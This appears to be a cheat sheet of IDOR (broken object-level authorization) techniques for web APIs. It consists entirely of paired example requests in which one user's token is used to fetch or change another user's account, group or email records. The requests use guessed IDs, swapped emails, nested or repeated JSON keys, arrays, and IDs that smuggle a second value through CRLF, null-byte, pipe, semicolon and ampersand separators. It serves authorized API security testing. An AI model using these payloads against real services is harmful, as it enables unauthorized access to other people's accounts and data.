**Predictable ID**
```bash
GET /api/v1/account/**2222** 
Token: UserA_token

GET /api/v1/account/**3333** 
Token: UserA_token
```

**ID combo**
```bash
GET /api/v1/**UserA**/data/2222 
Token: UserA_token

GET /api/v1/**UserB**/data/3333 
Token: UserA_token
```

**Integer as ID**
```bash
POST /api/v1/account/ 
Token: UserA_token 
{"Account": 2222 }


POST /api/v1/account/ 
Token: UserA_token 
{"Account": [3333]}
```

**Email as user ID**
```bash
POST /api/v1/user/account 
Token: UserA_token 
{"email": " UserA@email.com"}


POST /api/v1/user/account 
Token: UserA_token 
{"email": " UserB@email.com"}
```

**Group ID**
```bash
GET /api/v1/group/CompanyA 
Token: UserA_token

GET /api/v1/group/CompanyB
Token: UserA_token
```

**Group and user combo**
```bash
POST /api/v1/group/CompanyA 
Token: UserA_token 
{"email": " userA@CompanyA .com"}

POST /api/v1/group/CompanyB 
Token: UserA_token 
{"email": " userB@CompanyB .com"}
```

**Nested object**
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": {"Account" :3333}}
```

**Multiple objects**
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222, "Account": 3333, "Account": 5555 }
```

**Predictable token**
```bash
POST /api/v1/user/account 
Token: UserA_token 
{"data": "DflK1df7jSdfa1acaa"}

POST /api/v1/user/account
Token: UserA_token 
{"data": "DflK1df7jSdfa2dfaa"}
```

10-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0d%0a1111 }
```

11-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0a1111 }
```

12-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0d1111 }
```

13-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%001111 }
```

14-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": [2222,1111] }
```


15-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222;1111 }
```


16-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222,1111 }
```

17-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222|1111 }
```

18-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0a%0dcc:1111 }
```

19-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222&1111 }
```

20-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222#%1111 }
```
